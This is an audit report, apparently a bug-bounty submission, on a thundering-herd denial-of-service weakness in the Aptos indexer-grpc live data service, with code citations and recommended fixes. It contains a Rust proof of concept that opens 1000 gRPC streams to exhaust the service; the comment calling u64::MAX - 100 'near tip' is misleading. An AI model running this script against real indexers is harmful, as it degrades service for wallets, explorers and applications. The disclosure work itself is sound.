# Audit Report

## Title
Thundering Herd Vulnerability in Indexer-GRPC Live Data Service Causing Resource Exhaustion

## Summary
The `get_data()` function in the indexer-grpc data service's in-memory cache contains a thundering herd vulnerability. When multiple client streams wait for new blockchain data, they all wake simultaneously upon data arrival, causing CPU and memory spikes that can degrade service availability or crash the indexer service.

## Finding Description

The vulnerability exists in the waiting mechanism for new blockchain data. [1](#0-0) 

When clients request data at the tip of the blockchain (data not yet available), they enter a waiting loop that awaits a shared future. [2](#0-1) 

The `fetching_latest_data_task` is a `Shared<BoxFuture>` that multiple tasks can await. [3](#0-2) 

**Attack Scenario:**
1. Attacker opens hundreds/thousands of gRPC streams to the indexer service
2. Each stream spawns a task requesting data at/near the blockchain tip [4](#0-3) 
3. All tasks wait on the same shared future for new data
4. When new data arrives (every few seconds), ALL waiting tasks wake simultaneously
5. Each task then acquires a read lock and processes data independently [5](#0-4) 
6. This causes: CPU spike (waking thousands of tasks), lock contention on `data_manager`, memory allocation spike (each task creates result vectors), and potential OOM

The system has no limit on concurrent streams [6](#0-5) , enabling unbounded resource consumption.

## Impact Explanation

This qualifies as **High Severity** per Aptos bug bounty criteria: "API crashes" and service availability issues. The indexer-grpc service is critical infrastructure for ecosystem applications, wallets, and explorers. A successful attack causes:

- Service degradation/unavailability for all ecosystem participants
- Potential crash of the indexer service requiring restart
- Resource exhaustion affecting co-located services
- Economic impact on applications depending on the indexer

While not affecting consensus directly, the indexer's availability is essential for ecosystem functionality.

## Likelihood Explanation

**High Likelihood:**
- Attack requires no authentication or privileged access
- Simple to execute: open many gRPC connections requesting tip data
- No rate limiting or connection limits exist
- Automatically triggers every few seconds as new blocks arrive
- Low cost to attacker, high impact on service
- Pattern repeats continuously as blockchain produces blocks

## Recommendation

Implement multiple mitigations:

1. **Limit concurrent streams** - Add configurable maximum in connection_manager
2. **Use notification pattern** - Process new data once, notify all waiters without re-processing
3. **Rate limit wakeups** - Stagger task resumption to prevent simultaneous resource access
4. **Cache processed results** - Avoid redundant filtering/encoding for identical ranges
5. **Connection authentication** - Require API keys to prevent anonymous abuse

Example fix for notification pattern:
```rust
// Replace shared future with a broadcast channel
pub(super) struct FetchManager<'a> {
    // ... existing fields
    data_ready_notify: Arc<tokio::sync::Notify>,
}

// In get_data(), replace await on shared future:
while starting_version >= self.data_manager.read().await.end_version {
    self.fetch_manager.data_ready_notify.notified().await;
}
```

## Proof of Concept

```rust
// PoC: Spawn 1000 concurrent gRPC streams requesting tip data
use aptos_protos::indexer::v1::{
    data_service_client::DataServiceClient, GetTransactionsRequest
};
use tokio;

#[tokio::main]
async fn main() {
    let indexer_url = "http://indexer-grpc-endpoint:50051";
    
    let mut handles = vec![];
    for i in 0..1000 {
        let url = indexer_url.to_string();
        handles.push(tokio::spawn(async move {
            let mut client = DataServiceClient::connect(url).await.unwrap();
            let request = GetTransactionsRequest {
                starting_version: Some(u64::MAX - 100), // Near tip
                transactions_count: None, // Stream forever
                batch_size: Some(10),
                transaction_filter: None,
            };
            
            let mut stream = client.get_transactions(request).await.unwrap().into_inner();
            // Keep stream open, causing task to wait
            while let Some(_) = stream.message().await.unwrap() {
                // Consume slowly to maximize waiting tasks
                tokio::time::sleep(tokio::time::Duration::from_secs(10)).await;
            }
        }));
    }
    
    // All 1000 tasks now waiting for new data
    // When new block arrives, all wake simultaneously
    for handle in handles {
        handle.await.unwrap();
    }
}
```

Run this PoC against an indexer-grpc instance and observe resource spikes every few seconds as new blocks arrive. Monitor with `htop` for CPU spikes and memory usage patterns correlating with block production.

## Notes

This vulnerability specifically affects the indexer-grpc live data service, which is critical infrastructure for the Aptos ecosystem. While not directly impacting consensus, the indexer's availability is essential for wallets, explorers, and applications. The lack of connection limits combined with the shared future pattern creates a reliable DoS vector requiring minimal attacker resources.

### Citations

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L50-63)
```rust
        while starting_version >= self.data_manager.read().await.end_version {
            trace!("Reached head, wait...");
            let num_transactions = self
                .fetch_manager
                .fetching_latest_data_task
                .read()
                .await
                .as_ref()
                .unwrap()
                .clone()
                .await;

            trace!("Done waiting, got {num_transactions} transactions at head.");
        }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/in_memory_cache.rs (L66-100)
```rust
            let data_manager = self.data_manager.read().await;

            trace!("Getting data from cache, requested_version: {starting_version}, oldest available version: {}.", data_manager.start_version);
            if starting_version < data_manager.start_version {
                return None;
            }

            if data_manager.get_data(starting_version).is_none() {
                drop(data_manager);
                self.fetch_manager.fetch_past_data(starting_version).await;
                continue;
            }

            let mut total_bytes = 0;
            let mut version = starting_version;
            let ending_version = ending_version.min(data_manager.end_version);

            let mut result = Vec::new();
            while version < ending_version
                && total_bytes < max_bytes_per_batch
                && result.len() < max_num_transactions_per_batch
            {
                if let Some(transaction) = data_manager.get_data(version).as_ref() {
                    // NOTE: We allow 1 more txn beyond the size limit here, for simplicity.
                    if filter.is_none() || filter.as_ref().unwrap().matches(transaction) {
                        total_bytes += transaction.encoded_len();
                        result.push(transaction.as_ref().clone());
                    }
                    version += 1;
                } else {
                    break;
                }
            }
            trace!("Data was sent from cache, last version: {}.", version - 1);
            return Some((result, total_bytes, version - 1));
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/fetch_manager.rs (L14-14)
```rust
type FetchTask<'a> = Shared<BoxFuture<'a, usize>>;
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/fetch_manager.rs (L40-46)
```rust
    pub(super) async fn continuously_fetch_latest_data(&'a self) {
        loop {
            let task = self.fetch_latest_data().boxed().shared();
            *self.fetching_latest_data_task.write().await = Some(task.clone());
            let _ = task.await;
        }
    }
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/live_data_service/mod.rs (L127-139)
```rust
                scope.spawn(async move {
                    self.start_streaming(
                        id,
                        starting_version,
                        ending_version,
                        max_num_transactions_per_batch,
                        MAX_BYTES_PER_BATCH,
                        filter,
                        request_metadata,
                        response_sender,
                    )
                    .await
                });
```

**File:** ecosystem/indexer-grpc/indexer-grpc-data-service-v2/src/connection_manager.rs (L106-106)
```rust
    active_streams: DashMap<String, (ActiveStream, StreamProgressSamples)>,
```
